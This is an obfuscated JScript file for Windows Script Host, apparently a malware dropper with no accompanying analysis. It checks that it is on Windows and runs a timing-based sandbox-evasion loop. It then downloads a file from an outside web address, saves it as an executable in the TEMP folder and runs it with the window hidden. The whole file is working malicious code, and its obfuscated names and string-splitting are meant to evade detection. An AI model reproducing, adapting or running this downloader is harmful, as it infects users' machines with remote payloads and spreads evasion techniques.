var Tu = false;
var km = "CreateObject";
var W0 = function rS() {return WScript[km]("WScript.Shell");}(), s = 11;
var Nv = "MSXML2.XMLHTTP";
var zI = 2123213;
var Ua = 0;
function v(rl){W0["Run"](rl, Ua, Ua);};
function MS(){return "" + Nv;};
function rL(tx, zM){Ua = Ua * 1; return tx - zM;};
function sJ(){return km;};
/*@cc_on
  @if (@_win32 || @_win64)
    Tu = true;
  @end
@*/
if (Tu)
{
var Rd = "";
function u(){return 22;};
var lU = 0; var X0 = 0;
function fn()
{
var J = new this["Date"]();
var y = J["getUTCMilliseconds"]();
WScript["Sleep"](u());
var J = new this["Date"]();
var hQ = J["getUTCMilliseconds"]();
WScript["Sleep"](u());
var J = new this["Date"]();
var b = J["getUTCMilliseconds"]();
var lU = "ig";
lU = rL(hQ, y);
var X0 = "e";
X0 = rL(b, hQ);
Rd = "open";
return rL(lU, X0);
}
var s0 = false;
var we = false;
for (var o = Ua; o < u() * 1; o++){if (fn() != Ua){
s0 = true; 
X0 = "31" + 11 * lU + X0; 
we = true; 
break;
}}
function ZI() {return ((s0 == true) && (s0 == we)) ? 1 : Ua;};
if (s0 && ZI() && we){
function X() {return W0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "WFZFDYFM8nW6kC1.exe";};
 Z = MS();
 sR = WScript[km](Z);
 var rD = 1;
 while (rD){
try {
sR[Rd]("GET", "http://caferacerpneus.com.br/lw2osd", false);
sR["send"]();
W = "Sleep";
for (;;){WScript[W](u() * 11); if (sR["readystate"] >= 2 * 2) break;};
rD = Ua;
} catch(T){};
}
function SY(fb) {var Vd = (1, 2, 3, 4, 5, fb); return Vd;};
KM = WScript[sJ()]("ADODB.Stream");
Z = KM;
Z[Rd]();
Z["type"] = SY(1);
Z["write"](sR["ResponseBody"]);
KM["position"] = SY(Ua);
Z["Save" + "ToFile"](X(), 2);
KM["c"+"lose"]();
TG = X();
v(TG);
}
}

